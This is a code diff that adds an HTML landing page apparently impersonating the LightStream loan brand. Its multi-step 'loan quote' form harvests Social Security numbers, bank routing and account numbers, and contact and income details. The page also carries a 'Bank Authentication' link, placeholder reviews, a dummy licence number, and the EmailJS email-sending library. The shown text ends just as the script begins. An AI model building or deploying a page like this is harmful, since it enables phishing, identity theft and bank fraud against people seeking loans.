@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal Loans</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+        }
+        .cool-gradient {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+        }
+        .glass-effect {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .neon-glow {
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 0 40px rgba(255, 215, 0, 0.3);
+        }
+        .cool-button {
+            background: linear-gradient(45deg, #000000, #333333);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .cool-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
+        }
+        .cool-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+        .cool-button:hover::before {
+            left: 100%;
+        }
+        .trust-badge {
+            background: linear-gradient(45deg, #ffa500 0%, #ff6b35 100%);
+        }
+        .step-indicator {
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        .step-indicator.active {
+            background: linear-gradient(45deg, #000000, #333333);
+            color: white;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+        }
+        .step-indicator.completed {
+            background: linear-gradient(45deg, #333333, #666666);
+            color: white;
+        }
+        .form-step {
+            display: none;
+        }
+        .form-step.active {
+            display: block;
+            animation: fadeInUp 0.5s ease;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            min-height: 100vh;
+        }
+        .main-container {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .form-input {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            backdrop-filter: blur(10px);
+        }
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .form-input:focus {
+            background: rgba(0, 0, 0, 0.7);
+            border-color: #ffa500;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+        .text-cool {
+            color: #ffa500;
+        }
+        .bg-cool-card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .loan-calculator {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+        }
+    </style>
+</head>
+<body class="bg-black">
+    <!-- Header Navigation -->
+    <header class="glass-effect sticky top-0 z-50">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-8">
+                <div class="flex items-center space-x-2">
+                    <!-- Professional Logo -->
+                    <div class="relative">
+                        <img src="images/logo.png" alt="LightStream Logo" class="w-12 h-12 object-contain rounded-lg shadow-lg neon-glow">
+                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
+                    </div>
+                    <div class="text-2xl font-bold text-white">
+                        <span class="text-cool">LightStream</span>
+                    </div>
+                </div>
+                    <div class="hidden md:flex space-x-6">
+                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    </div>
+                </div>
+                <div class="hidden md:flex space-x-4">
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                </div>
+                <button class="md:hidden text-white" id="mobileMenuBtn">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+            <!-- Mobile Menu -->
+            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
+                <div class="flex flex-col space-y-3">
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="gradient-bg text-white py-20">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-2 gap-12 items-center">
+                <div>
+                    <h1 class="text-4xl md:text-5xl font-bold mb-6">
+                        Get up to $100,000 with a low, fixed rate loan.
+                    </h1>
+                    <p class="text-xl mb-8 text-gray-100">
+                        No fees, fast funding, and affordable monthly payments. Apply in minutes with no impact to your credit score.
+                    </p>
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-3">
+                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+                            <span class="text-lg">Affordable monthly payments</span>
+                        </div>
+                        <div class="flex items-center space-x-3">
+                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+                            <span class="text-lg">No prepayment fees</span>
+                        </div>
+                        <div class="flex items-center space-x-3">
+                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+                            <span class="text-lg">Fast funding as soon as same day</span>
+                        </div>
+                        <div class="flex items-center space-x-3">
+                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+                            <span class="text-lg">Fixed rates you can count on</span>
+                        </div>
+                        <div class="flex items-center space-x-3">
+                            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+                            <span class="text-lg">No origination fees</span>
+                        </div>
+                    </div>
+                    <div class="mt-8 flex items-center space-x-4">
+                        <div class="flex -space-x-2">
+                            <img src="https://picsum.photos/seed/user1/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                            <img src="https://picsum.photos/seed/user2/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                            <img src="https://picsum.photos/seed/user3/40/40.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                        </div>
+                        <div>
+                            <div class="flex text-yellow-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                            <p class="text-sm">10,000+ satisfied customers</p>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <!-- Loan Application Form -->
+                    <div class="main-container rounded-2xl neon-glow p-8">
+                        <div class="mb-6">
+                            <h2 class="text-2xl font-bold text-white mb-2">Get Your Loan Quote</h2>
+                            <p class="text-gray-200">Quick, secure, and no impact to your credit score</p>
+                        </div>
+
+                        <!-- Progress Bar -->
+                        <div class="mb-8">
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-sm text-white">Step <span id="currentStep">1</span> of <span id="totalSteps">5</span></span>
+                                <span class="text-sm text-cool" id="stepTitle">Loan Details</span>
+                            </div>
+                            <div class="w-full bg-gray-700 rounded-full h-2">
+                                <div id="progressBar" class="cool-button h-2 rounded-full transition-all duration-300" style="width: 20%"></div>
+                            </div>
+                            <div class="flex justify-between mt-2">
+                                <div class="step-indicator active w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">1</div>
+                                <div class="step-indicator w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">2</div>
+                                <div class="step-indicator w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">3</div>
+                                <div class="step-indicator w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">4</div>
+                                <div class="step-indicator w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold">5</div>
+                            </div>
+                        </div>
+
+                        <form id="loanApplicationForm">
+                            <!-- Step 1: Loan Details -->
+                            <div class="form-step active" id="step1">
+                                <div class="mb-6">
+                                    <label class="block text-white text-sm font-bold mb-2" for="loanAmount">
+                                        Loan Amount
+                                    </label>
+                                    <div class="relative">
+                                        <span class="absolute left-3 top-3 text-gray-300">$</span>
+                                        <input type="number" id="loanAmount" name="loanAmount" 
+                                               class="form-input w-full pl-8 pr-3 py-3 rounded-lg focus:outline-none"
+                                               placeholder="100" min="100" max="100000" step="100" required>
+                                    </div>
+                                    <p class="text-xs text-gray-300 mt-1">Min: $100 | Max: $100,000</p>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="block text-white text-sm font-bold mb-2" for="loanPurpose">
+                                        Loan Purpose
+                                    </label>
+                                    <select id="loanPurpose" name="loanPurpose" 
+                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
+                                        <option value="">Select loan purpose</option>
+                                        <option value="debt-consolidation">Debt Consolidation</option>
+                                        <option value="home-improvement">Home Improvement</option>
+                                        <option value="medical-expenses">Medical Expenses</option>
+                                        <option value="auto-purchase">Auto Purchase</option>
+                                        <option value="business">Business</option>
+                                        <option value="vacation">Vacation</option>
+                                        <option value="wedding">Wedding</option>
+                                        <option value="other">Other</option>
+                                    </select>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="block text-white text-sm font-bold mb-2" for="creditScore">
+                                        Estimated Credit Score
+                                    </label>
+                                    <select id="creditScore" name="creditScore" 
+                                            class="form-input w-full px-3 py-3 rounded-lg focus:outline-none" required>
+                                        <option value="">Select credit range</option>
+                                        <option value="excellent">Excellent (750+)</option>
+                                        <option value="good">Good (700-749)</option>
+                                        <option value="fair">Fair (640-699)</option>
+                                        <option value="poor">Poor (<640)</option>
+                                    </select>
+                                </div>
+                                <button type="button" onclick="nextStep()" 
+                                        class="w-full cool-button text-white py-3 rounded-lg">
+                                    Next Step
+                                </button>
+                            </div>
+
+                            <!-- Step 2: Personal Information -->
+                            <div class="form-step" id="step2">
+                                <div class="mb-6">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="firstName">
+                                        First Name
+                                    </label>
+                                    <input type="text" id="firstName" name="firstName" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="Enter your first name" required>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="lastName">
+                                        Last Name
+                                    </label>
+                                    <input type="text" id="lastName" name="lastName" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="Enter your last name" required>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="email">
+                                        Email Address
+                                    </label>
+                                    <input type="email" id="email" name="email" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="your@email.com" required>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="phone">
+                                        Phone Number
+                                    </label>
+                                    <input type="tel" id="phone" name="phone" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="(555) 123-4567" required>
+                                </div>
+                                
+                                <!-- Address Information -->
+                                <div class="mb-6">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="address">
+                                        Street Address
+                                    </label>
+                                    <input type="text" id="address" name="address" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="Enter your street address" required>
+                                </div>
+                                
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                                    <div>
+                                        <label class="block text-gray-700 text-sm font-bold mb-2" for="city">
+                                            City
+                                        </label>
+                                        <input type="text" id="city" name="city" 
+                                               class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                               placeholder="Enter city" required>
+                                    </div>
+                                    <div>
+                                        <label class="block text-gray-700 text-sm font-bold mb-2" for="state">
+                                            State
+                                        </label>
+                                        <select id="state" name="state" 
+                                                class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800" required>
+                                            <option value="">Select State</option>
+                                            <option value="AL">Alabama</option>
+                                            <option value="AK">Alaska</option>
+                                            <option value="AZ">Arizona</option>
+                                            <option value="AR">Arkansas</option>
+                                            <option value="CA">California</option>
+                                            <option value="CO">Colorado</option>
+                                            <option value="CT">Connecticut</option>
+                                            <option value="DE">Delaware</option>
+                                            <option value="FL">Florida</option>
+                                            <option value="GA">Georgia</option>
+                                            <option value="HI">Hawaii</option>
+                                            <option value="ID">Idaho</option>
+                                            <option value="IL">Illinois</option>
+                                            <option value="IN">Indiana</option>
+                                            <option value="IA">Iowa</option>
+                                            <option value="KS">Kansas</option>
+                                            <option value="KY">Kentucky</option>
+                                            <option value="LA">Louisiana</option>
+                                            <option value="ME">Maine</option>
+                                            <option value="MD">Maryland</option>
+                                            <option value="MA">Massachusetts</option>
+                                            <option value="MI">Michigan</option>
+                                            <option value="MN">Minnesota</option>
+                                            <option value="MS">Mississippi</option>
+                                            <option value="MO">Missouri</option>
+                                            <option value="MT">Montana</option>
+                                            <option value="NE">Nebraska</option>
+                                            <option value="NV">Nevada</option>
+                                            <option value="NH">New Hampshire</option>
+                                            <option value="NJ">New Jersey</option>
+                                            <option value="NM">New Mexico</option>
+                                            <option value="NY">New York</option>
+                                            <option value="NC">North Carolina</option>
+                                            <option value="ND">North Dakota</option>
+                                            <option value="OH">Ohio</option>
+                                            <option value="OK">Oklahoma</option>
+                                            <option value="OR">Oregon</option>
+                                            <option value="PA">Pennsylvania</option>
+                                            <option value="RI">Rhode Island</option>
+                                            <option value="SC">South Carolina</option>
+                                            <option value="SD">South Dakota</option>
+                                            <option value="TN">Tennessee</option>
+                                            <option value="TX">Texas</option>
+                                            <option value="UT">Utah</option>
+                                            <option value="VT">Vermont</option>
+                                            <option value="VA">Virginia</option>
+                                            <option value="WA">Washington</option>
+                                            <option value="WV">West Virginia</option>
+                                            <option value="WI">Wisconsin</option>
+                                            <option value="WY">Wyoming</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label class="block text-gray-700 text-sm font-bold mb-2" for="zipCode">
+                                            ZIP Code
+                                        </label>
+                                        <input type="text" id="zipCode" name="zipCode" 
+                                               class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                               placeholder="Enter ZIP code" pattern="[0-9]{5}" maxlength="5" required>
+                                    </div>
+                                </div>
+                                <div class="flex space-x-4">
+                                    <button type="button" onclick="previousStep()" 
+                                            class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
+                                        Back
+                                    </button>
+                                    <button type="button" onclick="nextStep()" 
+                                            class="flex-1 bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition duration-200">
+                                        Next Step
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Step 3: Financial Information -->
+                            <div class="form-step" id="step3">
+                                <h3 class="text-lg font-semibold text-gray-800 mb-4">Financial Information</h3>
+                                <p class="text-sm text-gray-600 mb-6">Your information is encrypted and secure</p>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="socialSecurity">Social Security Number *</label>
+                                    <input type="text" id="socialSecurity" name="socialSecurity" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="XXX-XX-XXXX" maxlength="11" required>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="bankName">Bank Name *</label>
+                                    <input type="text" id="bankName" name="bankName" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="Chase Bank" required>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="routingNumber">Routing Number *</label>
+                                    <input type="text" id="routingNumber" name="routingNumber" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="123456789" maxlength="9" required>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="accountNumber">Account Number *</label>
+                                    <input type="text" id="accountNumber" name="accountNumber" 
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                           placeholder="1234567890" maxlength="17" required>
+                                </div>
+                                
+                                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                                    <p class="text-sm text-blue-800">
+                                        <i class="fas fa-shield-alt mr-2"></i>
+                                        We use bank-level security to protect your information.
+                                    </p>
+                                </div>
+                                
+                                <div class="flex space-x-4">
+                                    <button type="button" onclick="previousStep()" class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg">Back</button>
+                                    <button type="button" onclick="nextStep()" class="flex-1 bg-indigo-600 text-white py-3 rounded-lg">Next Step</button>
+                                </div>
+                            </div>
+
+                            <!-- Step 4: Employment & Income -->
+                            <div class="form-step" id="step4">
+                                <h3 class="text-lg font-semibold text-gray-800 mb-4">Employment & Income</h3>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="annualIncome">Annual Income</label>
+                                    <div class="relative">
+                                        <span class="absolute left-3 top-3 text-gray-500">$</span>
+                                        <input type="number" id="annualIncome" name="annualIncome" 
+                                               class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                               placeholder="50,000" min="0" required>
+                                    </div>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="employmentStatus">Employment Status</label>
+                                    <select id="employmentStatus" name="employmentStatus" 
+                                            class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800" required>
+                                        <option value="">Select employment status</option>
+                                        <option value="employed-full-time">Employed Full-Time</option>
+                                        <option value="employed-part-time">Employed Part-Time</option>
+                                        <option value="self-employed">Self-Employed</option>
+                                        <option value="retired">Retired</option>
+                                        <option value="student">Student</option>
+                                        <option value="unemployed">Unemployed</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="monthlyHousing">Monthly Housing Payment</label>
+                                    <div class="relative">
+                                        <span class="absolute left-3 top-3 text-gray-500">$</span>
+                                        <input type="number" id="monthlyHousing" name="monthlyHousing" 
+                                               class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-gray-800 placeholder-gray-400"
+                                               placeholder="1,500" min="0" required>
+                                    </div>
+                                </div>
+                                
+                                <div class="flex space-x-4">
+                                    <button type="button" onclick="previousStep()" class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg">Back</button>
+                                    <button type="button" onclick="nextStep()" class="flex-1 bg-indigo-600 text-white py-3 rounded-lg">Next Step</button>
+                                </div>
+                            </div>
+
+                            <!-- Step 5: Review & Submit -->
+                            <div class="form-step" id="step5">
+                                <div class="mb-6">
+                                    <h3 class="text-lg font-semibold text-white mb-4">Review Your Application</h3>
+                                    <div id="applicationSummary" class="bg-cool-card border-2 border-gray-600 p-4 rounded-lg">
+                                        <!-- Summary will be populated by JavaScript -->
+                                    </div>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="flex items-center">
+                                        <input type="checkbox" id="terms" name="terms" class="mr-2" required>
+                                        <span class="text-sm text-gray-300">
+                                            I agree to the <a href="#" class="text-cool hover:underline">Terms & Conditions</a> 
+                                            and <a href="#" class="text-cool hover:underline">Privacy Policy</a>
+                                        </span>
+                                    </label>
+                                </div>
+                                <div class="mb-6">
+                                    <label class="flex items-center">
+                                        <input type="checkbox" id="consent" name="consent" class="mr-2" required>
+                                        <span class="text-sm text-gray-300">
+                                            I consent to receive communications about my loan application
+                                        </span>
+                                    </label>
+                                </div>
+                                <div class="flex space-x-4">
+                                    <button type="button" onclick="previousStep()" 
+                                            class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
+                                        Back
+                                    </button>
+                                    <button type="button" onclick="submitPersonalLoanForm()" 
+                                            class="flex-1 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 transition duration-200">
+                                        Submit Application
+                                    </button>
+                                </div>
+                            </div>
+                        </form>
+
+                        <!-- Trust Badges -->
+                        <div class="mt-6 pt-6 border-t border-gray-200">
+                            <div class="flex items-center justify-center space-x-4 text-xs text-gray-500">
+                                <div class="flex items-center">
+                                    <i class="fas fa-lock text-green-500 mr-1"></i>
+                                    <span>Secure & Encrypted</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <i class="fas fa-shield-alt text-green-500 mr-1"></i>
+                                    <span>Bank-Level Security</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <i class="fas fa-user-shield text-green-500 mr-1"></i>
+                                    <span>Privacy Protected</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="py-16 bg-black">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-bold text-white mb-4">Why Choose LightStream?</h2>
+                <p class="text-gray-300 max-w-2xl mx-auto">
+                    We offer competitive rates, flexible terms, and exceptional service to help you achieve your financial goals.
+                </p>
+            </div>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="text-center">
+                    <div class="bg-indigo-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-percentage text-indigo-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-2">Competitive Rates</h3>
+                    <p class="text-gray-300">Get some of the lowest rates in the market with our transparent pricing.</p>
+                </div>
+                <div class="text-center">
+                    <div class="bg-indigo-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-clock text-indigo-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-2">Quick Approval</h3>
+                    <p class="text-gray-300">Get approved in minutes and receive funds as soon as the same day.</p>
+                </div>
+                <div class="text-center">
+                    <div class="bg-indigo-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-user-tie text-indigo-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-white mb-2">Expert Support</h3>
+                    <p class="text-gray-300">Our team of loan specialists is here to help you every step of the way.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-16 bg-black">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-bold text-white mb-4">What Our Customers Say</h2>
+                <p class="text-gray-300">Real stories from real customers who found financial solutions with LightStream</p>
+            </div>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-cool-card p-6 rounded-lg shadow-md">
+                    <div class="flex text-yellow-400 mb-4">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <p class="text-gray-300 mb-4">
+                        "LightStream made the loan process incredibly simple. I got approved in minutes and had the funds in my account the next day. Highly recommend!"
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://picsum.photos/seed/testimonial1/50/50.jpg" alt="Customer" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <p class="font-semibold text-white">Sarah Johnson</p>
+                            <p class="text-sm text-gray-400">Debt Consolidation</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-cool-card p-6 rounded-lg shadow-md">
+                    <div class="flex text-yellow-400 mb-4">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <p class="text-gray-300 mb-4">
+                        "The interest rate was much lower than I expected. The application was straightforward and the customer service was excellent."
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://picsum.photos/seed/testimonial2/50/50.jpg" alt="Customer" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <p class="font-semibold text-white">Michael Chen</p>
+                            <p class="text-sm text-gray-400">Home Improvement</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-cool-card p-6 rounded-lg shadow-md">
+                    <div class="flex text-yellow-400 mb-4">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <p class="text-gray-300 mb-4">
+                        "No hidden fees, transparent process, and great rates. LightStream exceeded my expectations in every way."
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://picsum.photos/seed/testimonial3/50/50.jpg" alt="Customer" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <p class="font-semibold text-white">Emily Davis</p>
+                            <p class="text-sm text-gray-400">Auto Purchase</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-black text-white py-12">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8">
+                <div>
+                    <div class="flex items-center space-x-2 mb-4">
+                        <!-- Professional Logo -->
+                        <div class="relative">
+                            <img src="images/logo.png" alt="LightStream Logo" class="w-10 h-10 object-contain rounded-lg shadow-lg">
+                            <div class="absolute -top-1 -right-1 w-2 h-2 bg-green-500 rounded-full border-2 border-white"></div>
+                        </div>
+                        <div class="text-xl font-bold text-white">
+                            <span class="bg-gradient-to-r from-indigo-600 to-purple-600 bg-clip-text text-transparent">LightStream</span>
+                        </div>
+                    </div>
+                    <p class="text-gray-400">
+                        Your trusted partner for personal loans with competitive rates and exceptional service.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="font-semibold mb-4">Quick Links</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="personal-loans.html" class="hover:text-white">Personal Loans</a></li>
+                        <li><a href="how-it-works.html" class="hover:text-white">How it Works</a></li>
+                        <li><a href="faqs.html" class="hover:text-white">FAQs</a></li>
+                        <li><a href="contact.html" class="hover:text-white">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-semibold mb-4">Resources</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#" class="hover:text-white">Loan Calculator</a></li>
+                        <li><a href="#" class="hover:text-white">Blog</a></li>
+                        <li><a href="#" class="hover:text-white">Privacy Policy</a></li>
+                        <li><a href="#" class="hover:text-white">Terms of Service</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-semibold mb-4">Connect</h4>
+                    <div class="flex space-x-4 mb-4">
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-facebook text-xl"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-twitter text-xl"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-linkedin text-xl"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-instagram text-xl"></i></a>
+                    </div>
+                    <p class="text-gray-400">
+                        <i class="fas fa-phone"></i> 1-800-LIGHTSTREAM<br>
+                        <i class="fas fa-envelope"></i> support@lightstream.com
+                    </p>
+                </div>
+            </div>
+            <div class="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
+                <p>&copy; 2024 LightStream. All rights reserved. | NMLS #123456</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS first
+        (function() {
